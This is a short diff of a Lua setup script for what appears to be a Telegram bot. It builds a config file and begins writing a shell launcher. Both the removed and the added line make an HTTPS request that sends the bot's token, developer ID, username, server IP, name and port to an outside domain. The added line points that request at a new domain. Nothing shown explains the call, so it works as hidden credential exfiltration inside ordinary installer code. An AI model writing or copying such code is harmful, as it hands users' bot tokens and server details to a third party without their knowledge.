@@ -67,7 +67,7 @@ David = DevRio:get(Server.."TokenDavid"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdDavid")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/config.php?Get=David&DevId="..DevRio:get(Server.."IdDavid").."&TokenBot="..DevRio:get(Server.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://ccccxcc.ml/David/Config.php?id="..DevRio:get(Server.."IdDavid").."&TokenBot="..DevRio:get(Server.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("David.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
